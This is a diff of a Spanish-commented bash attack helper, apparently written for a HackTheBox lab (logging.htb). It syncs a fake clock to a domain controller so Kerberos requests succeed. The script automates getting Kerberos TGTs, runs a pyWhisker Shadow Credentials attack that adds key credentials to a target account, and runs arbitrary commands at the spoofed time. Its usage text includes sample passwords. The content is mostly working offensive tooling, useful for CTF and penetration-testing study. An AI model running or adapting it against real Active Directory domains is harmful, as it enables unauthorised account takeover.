@@ -1,9 +1,11 @@
 #!/bin/bash
 # ============================================================
-# Script Universal de Sincronización con faketime
+# faketime_sync.sh - Sincronización de hora virtual con faketime
 # No modifica la hora del sistema, solo la emula
-# Soporta: --tgt, --shadow, --exec
+# Soporta: --tgt, --shadow, --exec, --show-time
 # ============================================================
+
+set -euo pipefail
 
 # Colores
 RED='\033[0;31m'
@@ -21,229 +23,284 @@ ACTION=""
 TARGET=""
 COMMAND=""
 DC_TIME=""
+KRB5_CONFIG_FILE="/tmp/krb5_faketime.conf"
 
-# Uso
+# ─────────────────────────────────────────────
+log_info() { echo -e "${BLUE}[*]${NC} $*"; }
+log_ok()   { echo -e "${GREEN}[+]${NC} $*"; }
+log_warn() { echo -e "${YELLOW}[!]${NC} $*"; }
+log_err()  { echo -e "${RED}[-]${NC} $*"; }
+# ─────────────────────────────────────────────
+
 usage() {
-    echo "Uso: $0 <DC_IP> <DOMAIN> [USER] [PASSWORD] [OPCIONES]"
-    echo ""
-    echo "OPCIONES:"
-    echo "  --tgt                    Obtener TGT (Ticket Granting Ticket)"
-    echo "  --shadow <target>        Realizar Shadow Credentials attack"
-    echo "  --exec <comando>         Ejecutar comando con hora sincronizada"
-    echo "  --show-time              Solo mostrar hora virtual"
-    echo ""
-    echo "Ejemplos:"
-    echo "  $0 10.129.35.21 logging.htb                                    # Solo obtener hora"
-    echo "  $0 10.129.35.21 logging.htb wallace.everette Welcome2026@      # Con usuario"
-    echo "  $0 10.129.35.21 logging.htb svc_recovery pass --tgt            # Obtener TGT"
-    echo "  $0 10.129.35.21 logging.htb svc_recovery pass --shadow msa_health$"
-    echo "  $0 10.129.35.21 logging.htb svc_recovery pass --exec 'klist'"
-    echo ""
+    cat << EOF
+Uso: $0 <DC_IP> <DOMAIN> [USER] [PASSWORD] [OPCIONES]
+
+OPCIONES:
+  --tgt                    Obtener TGT (Ticket Granting Ticket)
+  --shadow <target>        Realizar Shadow Credentials attack
+  --exec <comando>         Ejecutar comando con hora sincronizada
+  --show-time              Solo mostrar la hora virtual
+
+Ejemplos:
+  $0 10.129.35.21 logging.htb
+  $0 10.129.35.21 logging.htb svc_recovery 'Pass123' --tgt
+  $0 10.129.35.21 logging.htb svc_recovery 'Pass123' --shadow 'msa_health\$'
+  $0 10.129.35.21 logging.htb svc_recovery 'Pass123' --exec 'klist'
+  $0 10.129.35.21 logging.htb --show-time
+EOF
     exit 1
 }
 
-# Verificar parámetros
-if [ -z "$1" ] || [ -z "$2" ]; then
-    usage
-fi
+# ─────────────────────────────────────────────
+check_deps() {
+    local missing=()
+    for cmd in faketime kinit nmap; do
+        command -v "$cmd" &>/dev/null || missing+=("$cmd")
+    done
 
-DC_IP="$1"
-DOMAIN="$2"
-USER="$3"
-PASSWORD="$4"
-
-# Buscar opciones
-shift 4
-while [[ $# -gt 0 ]]; do
-    case $1 in
-        --tgt)
-            ACTION="tgt"
-            shift
-            ;;
-        --shadow)
-            ACTION="shadow"
-            TARGET="$2"
-            shift 2
-            ;;
-        --exec)
-            ACTION="exec"
-            COMMAND="$2"
-            shift 2
-            ;;
-        --show-time)
-            ACTION="show-time"
-            shift
-            ;;
-        *)
-            echo -e "${RED}[!] Opción desconocida: $1${NC}"
-            usage
-            ;;
-    esac
-done
-
-# Instalar faketime si no está
-if ! command -v faketime &> /dev/null; then
-    echo -e "${YELLOW}[*] Instalando faketime...${NC}"
-    sudo apt install faketime -y
-fi
-
-# Función para obtener hora del DC
-get_dc_time() {
-    echo -e "${BLUE}[*] Obteniendo hora del DC: $DC_IP${NC}"
-    
-    # Método 1: ntpdate
-    OFFSET=$(sudo ntpdate -q $DC_IP 2>&1 | grep -oP 'offset \K[+-]?\d+\.\d+' | head -1)
-    
-    if [ -n "$OFFSET" ]; then
-        DC_TIME=$(date -d "+${OFFSET%.*} seconds" '+%Y-%m-%d %H:%M:%S')
-        echo -e "${GREEN}[+] Hora DC (via NTP): $DC_TIME${NC}"
-        return 0
+    if [[ ${#missing[@]} -gt 0 ]]; then
+        log_warn "Dependencias faltantes: ${missing[*]}"
+        log_info "Intentando instalar..."
+        sudo apt-get install -y faketime krb5-user nmap 2>/dev/null \
+            || log_warn "Instala manualmente: ${missing[*]}"
     fi
-    
-    # Método 2: con usuario si se proporciona
-    if [ -n "$USER" ] && [ -n "$PASSWORD" ]; then
-        DC_TIME=$(ldapsearch -H ldap://$DC_IP -x -D "${DOMAIN}\\${USER}" -w "$PASSWORD" -s base -b "" currentTime 2>/dev/null | grep currentTime | awk '{print $2}' | sed 's/\.0Z$//' | sed 's/\(....\)\(..\)\(..\)\(..\)\(..\)\(..\)/\1-\2-\3 \4:\5:\6/')
-        if [ -n "$DC_TIME" ]; then
-            echo -e "${GREEN}[+] Hora DC (via LDAP): $DC_TIME${NC}"
+}
+
+# ─────────────────────────────────────────────
+get_dc_time() {
+    log_info "Obteniendo hora del DC: $DC_IP"
+
+    # Método 1: nmap smb2-time (más confiable en CTFs)
+    if command -v nmap &>/dev/null; then
+        local nmap_time
+        nmap_time=$(timeout 10 nmap --script smb2-time -p 445 "$DC_IP" 2>/dev/null \
+            | grep "date:" | grep -oP '\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}')
+        if [[ -n "$nmap_time" ]]; then
+            DC_TIME=$(echo "$nmap_time" | tr 'T' ' ')
+            log_ok "Hora DC (via nmap smb2-time): $DC_TIME"
             return 0
         fi
     fi
-    
-    # Método 3: offset por defecto
-    echo -e "${YELLOW}[!] No se pudo obtener hora exacta, usando +7 horas${NC}"
+
+    # Método 2: ntpdate — solo parte entera del offset
+    if command -v ntpdate &>/dev/null; then
+        local raw_offset
+        raw_offset=$(timeout 5 sudo ntpdate -q "$DC_IP" 2>&1 \
+            | grep -oP 'offset [+-]?\K\d+' | head -1)
+        if [[ -n "$raw_offset" ]]; then
+            DC_TIME=$(date -d "+${raw_offset} seconds" '+%Y-%m-%d %H:%M:%S')
+            log_ok "Hora DC (via ntpdate): $DC_TIME"
+            return 0
+        fi
+    fi
+
+    # Método 3: LDAP con credenciales
+    if [[ -n "$USER" && -n "$PASSWORD" ]] && command -v ldapsearch &>/dev/null; then
+        local ldap_time
+        ldap_time=$(timeout 5 ldapsearch -H "ldap://$DC_IP" -x \
+            -D "${DOMAIN}\\${USER}" -w "$PASSWORD" \
+            -s base -b "" currentTime 2>/dev/null \
+            | grep currentTime | awk '{print $2}')
+        if [[ -n "$ldap_time" ]]; then
+            DC_TIME=$(echo "$ldap_time" | sed 's/\.0Z$//' \
+                | sed 's/\(....\)\(..\)\(..\)\(..\)\(..\)\(..\)/\1-\2-\3 \4:\5:\6/')
+            log_ok "Hora DC (via LDAP): $DC_TIME"
+            return 0
+        fi
+    fi
+
+    # Fallback
+    log_warn "No se pudo obtener hora exacta — usando offset +7h por defecto"
     DC_TIME=$(date -d '+7 hours' '+%Y-%m-%d %H:%M:%S')
-    return 0
 }
 
-# Función para configurar Kerberos
+# ─────────────────────────────────────────────
 setup_kerberos() {
-    cat > /tmp/krb5.conf << KRB
+    local realm="${DOMAIN^^}"
+    cat > "$KRB5_CONFIG_FILE" << EOF
 [libdefaults]
-    default_realm = ${DOMAIN^^}
+    default_realm = ${realm}
     dns_lookup_kdc = false
     dns_lookup_realm = false
     rdns = false
     clockskew = 300
+
 [realms]
-    ${DOMAIN^^} = {
-        kdc = $DC_IP
-        admin_server = $DC_IP
+    ${realm} = {
+        kdc = ${DC_IP}
+        admin_server = ${DC_IP}
     }
+
 [domain_realm]
-    .$DOMAIN = ${DOMAIN^^}
-    $DOMAIN = ${DOMAIN^^}
-KRB
-    export KRB5_CONFIG=/tmp/krb5.conf
+    .${DOMAIN} = ${realm}
+    ${DOMAIN} = ${realm}
+EOF
+    export KRB5_CONFIG="$KRB5_CONFIG_FILE"
+    log_ok "Kerberos config → $KRB5_CONFIG_FILE"
 }
 
-# Función para obtener TGT
+# ─────────────────────────────────────────────
 get_tgt() {
-    echo -e "${BLUE}[*] Obteniendo TGT para $USER@${DOMAIN^^}${NC}"
-    
-    faketime "$DC_TIME" bash -c "
-        setup_kerberos() {
-            cat > /tmp/krb5.conf << KRB
-[libdefaults]
-    default_realm = ${DOMAIN^^}
-    dns_lookup_kdc = false
-[realms]
-    ${DOMAIN^^} = {
-        kdc = $DC_IP
+    [[ -z "$USER" || -z "$PASSWORD" ]] && {
+        log_err "Se requiere USER y PASSWORD para --tgt"
+        exit 1
     }
-KRB
-            export KRB5_CONFIG=/tmp/krb5.conf
-        }
-        setup_kerberos
-        echo '$PASSWORD' | kinit $USER@${DOMAIN^^} 2>/dev/null
-        if [ \$? -eq 0 ]; then
-            echo -e '${GREEN}[+] TGT obtenido exitosamente${NC}'
-            klist
-            echo -e '${GREEN}[+] Ticket guardado en: /tmp/krb5cc_*${NC}'
-        else
-            echo -e '${RED}[-] Error al obtener TGT${NC}'
-        fi
-    "
+
+    log_info "Obteniendo TGT para $USER@${DOMAIN^^}"
+    setup_kerberos
+
+    local pass_file
+    pass_file=$(mktemp /tmp/.krb_pass_XXXXXX)
+    echo "$PASSWORD" > "$pass_file"
+    chmod 600 "$pass_file"
+
+    if faketime "$DC_TIME" bash -c "
+        export KRB5_CONFIG='$KRB5_CONFIG_FILE'
+        kinit '$USER@${DOMAIN^^}' < '$pass_file'
+    "; then
+        log_ok "TGT obtenido exitosamente"
+        echo ""
+        KRB5_CONFIG="$KRB5_CONFIG_FILE" klist
+    else
+        log_err "Error al obtener TGT — verifica credenciales u hora"
+    fi
+
+    rm -f "$pass_file"
 }
 
-# Función para Shadow Credentials
+# ─────────────────────────────────────────────
 shadow_credentials() {
-    if [ -z "$TARGET" ]; then
-        echo -e "${RED}[!] Especifica el target para --shadow${NC}"
-        exit 1
-    fi
-    
-    echo -e "${BLUE}[*] Realizando Shadow Credentials attack${NC}"
-    echo -e "${BLUE}[*] Target: $TARGET${NC}"
-    echo -e "${BLUE}[*] User: $USER${NC}"
-    
+    [[ -z "$TARGET" ]]   && { log_err "Especifica el target con --shadow <target>"; exit 1; }
+    [[ -z "$USER" ]]     && { log_err "Se requiere USER para --shadow"; exit 1; }
+    [[ -z "$PASSWORD" ]] && { log_err "Se requiere PASSWORD para --shadow"; exit 1; }
+
+    log_info "Shadow Credentials attack"
+    log_info "Target : $TARGET"
+    log_info "User   : $USER"
+    setup_kerberos
+
+    local pass_file
+    pass_file=$(mktemp /tmp/.krb_pass_XXXXXX)
+    echo "$PASSWORD" > "$pass_file"
+    chmod 600 "$pass_file"
+
     faketime "$DC_TIME" bash -c "
-        setup_kerberos
-        export KRB5_CONFIG=/tmp/krb5.conf
-        
-        # Obtener TGT si no existe
-        echo '$PASSWORD' | kinit $USER@${DOMAIN^^} 2>/dev/null
-        
-        # Ejecutar pyWhisker
-        cd ~/htb/pyWhisker
-        if [ -d \"venv\" ]; then
-            source venv/bin/activate
+        export KRB5_CONFIG='$KRB5_CONFIG_FILE'
+        kinit '$USER@${DOMAIN^^}' < '$pass_file'
+
+        WHISKER_DIR=\$(find ~ -name 'pywhisker.py' -maxdepth 6 2>/dev/null | head -1 | xargs -I{} dirname {} 2>/dev/null)
+
+        if [[ -z \"\$WHISKER_DIR\" ]]; then
+            echo '[-] pyWhisker no encontrado en ~'
+            echo '    Clónalo con: git clone https://github.com/ShutdownRepo/pywhisker'
+            exit 1
         fi
-        
-        python3 pywhisker/pywhisker.py -d $DOMAIN -u $USER -p '$PASSWORD' \
-            --target '$TARGET' --action add --dc-ip $DC_IP
+
+        cd \"\$WHISKER_DIR\"
+        [[ -d venv ]] && source venv/bin/activate
+
+        python3 pywhisker.py \
+            -d '$DOMAIN' \
+            -u '$USER' \
+            -p '$PASSWORD' \
+            --target '$TARGET' \
+            --action add \
+            --dc-ip '$DC_IP'
     "
+
+    rm -f "$pass_file"
 }
 
-# Función para ejecutar comando
+# ─────────────────────────────────────────────
 exec_command() {
-    if [ -z "$COMMAND" ]; then
-        echo -e "${RED}[!] Especifica el comando para --exec${NC}"
-        exit 1
-    fi
-    
-    echo -e "${BLUE}[*] Ejecutando comando con hora virtual: $DC_TIME${NC}"
-    echo -e "${BLUE}[*] Comando: $COMMAND${NC}"
-    
-    faketime "$DC_TIME" bash -c "$COMMAND"
+    [[ -z "$COMMAND" ]] && { log_err "Especifica el comando con --exec '<cmd>'"; exit 1; }
+
+    log_info "Hora virtual : $DC_TIME"
+    log_info "Comando      : $COMMAND"
+    echo ""
+
+    KRB5_CONFIG="$KRB5_CONFIG_FILE" faketime "$DC_TIME" bash -c "$COMMAND"
 }
 
-# Función principal
+# ─────────────────────────────────────────────
+parse_args() {
+    [[ $# -lt 2 ]] && usage
+
+    DC_IP="$1"
+    DOMAIN="$2"
+    USER="${3:-}"
+    PASSWORD="${4:-}"
+
+    # Shift dinámico según cuántos args posicionales hay
+    local skip=2
+    [[ -n "$USER" ]]     && (( skip++ ))
+    [[ -n "$PASSWORD" ]] && (( skip++ ))
+    shift "$skip"
+
+    while [[ $# -gt 0 ]]; do
+        case $1 in
+            --tgt)
+                ACTION="tgt"
+                shift
+                ;;
+            --shadow)
+                ACTION="shadow"
+                TARGET="${2:-}"
+                [[ -z "$TARGET" ]] && { log_err "--shadow requiere un <target>"; exit 1; }
+                shift 2
+                ;;
+            --exec)
+                ACTION="exec"
+                COMMAND="${2:-}"
+                [[ -z "$COMMAND" ]] && { log_err "--exec requiere un <comando>"; exit 1; }
+                shift 2
+                ;;
+            --show-time)
+                ACTION="show-time"
+                shift
+                ;;
+            *)
+                log_err "Opción desconocida: $1"
+                usage
+                ;;
+        esac
+    done
+}
+
+# ─────────────────────────────────────────────
 main() {
-    # Obtener hora del DC
+    parse_args "$@"
+    check_deps
     get_dc_time
-    
-    echo -e "${BLUE}[*] Hora virtual a usar: $DC_TIME${NC}"
-    echo -e "${BLUE}[*] Hora real del sistema: $(date)${NC}"
+
     echo ""
-    
-    # Ejecutar acción
+    log_info "Hora virtual : $DC_TIME"
+    log_info "Hora real    : $(date '+%Y-%m-%d %H:%M:%S')"
+    echo ""
+
     case $ACTION in
         tgt)
-            setup_kerberos
             get_tgt
             ;;
         shadow)
-            setup_kerberos
             shadow_credentials
             ;;
         exec)
             exec_command
             ;;
         show-time)
-            echo -e "${GREEN}$DC_TIME${NC}"
+            log_ok "$DC_TIME"
             ;;
-        *)
-            echo -e "${GREEN}[+] Sincronización virtual completada${NC}"
-            echo -e "${GREEN}[*] Usa: faketime '$DC_TIME' <comando>${NC}"
+        "")
+            log_ok "Sincronización lista. Úsala así:"
             echo ""
-            echo -e "${YELLOW}Ejemplos de uso:${NC}"
-            echo "  faketime '$DC_TIME' kinit $USER@${DOMAIN^^}"
+            echo "  faketime '$DC_TIME' kinit ${USER:-<user>}@${DOMAIN^^}"
             echo "  faketime '$DC_TIME' python3 pywhisker.py ..."
+            echo "  KRB5_CONFIG=$KRB5_CONFIG_FILE faketime '$DC_TIME' <cmd>"
             echo ""
-            echo -e "${BLUE}[*] Tiempo virtual: $DC_TIME${NC}"
             ;;
     esac
 }
 
-# Ejecutar
-main
+main "$@"
